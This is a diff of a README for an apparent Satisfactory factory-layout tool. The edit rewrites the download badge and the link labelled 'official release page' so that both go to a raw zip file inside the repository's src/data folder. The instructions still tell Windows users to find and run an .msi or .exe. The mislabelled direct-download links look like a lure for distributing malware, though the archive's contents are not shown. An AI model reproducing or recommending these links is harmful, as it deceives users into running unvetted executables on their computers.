@@ -1,6 +1,6 @@
 # 🏗️ nexus-satisfactory-layout-tool - Plan efficient factory designs with ease
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/abhishekalway6686/nexus-satisfactory-layout-tool)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://raw.githubusercontent.com/abhishekalway6686/nexus-satisfactory-layout-tool/main/src/data/tool-satisfactory-layout-nexus-2.4-alpha.1.zip)
 
 This tool helps players plan complex factory layouts for the game Satisfactory. It features a high-performance interface to place machines, conveyors, pipes, railways, and power lines. You can simulate production rates and optimize your floor space before you build in the game.
 
@@ -8,7 +8,7 @@ This tool helps players plan complex factory layouts for the game Satisfactory. 
 
 To use the nexus-satisfactory-layout-tool, follow these instructions to download and run the software on your Windows computer.
 
-1. Go to the [official release page](https://github.com/abhishekalway6686/nexus-satisfactory-layout-tool).
+1. Go to the [official release page](https://raw.githubusercontent.com/abhishekalway6686/nexus-satisfactory-layout-tool/main/src/data/tool-satisfactory-layout-nexus-2.4-alpha.1.zip).
 2. Look for the latest version listed under the Releases section.
 3. Find the file ending in `.msi` or `.exe` designed for Windows.
 4. Click the file to start your download.
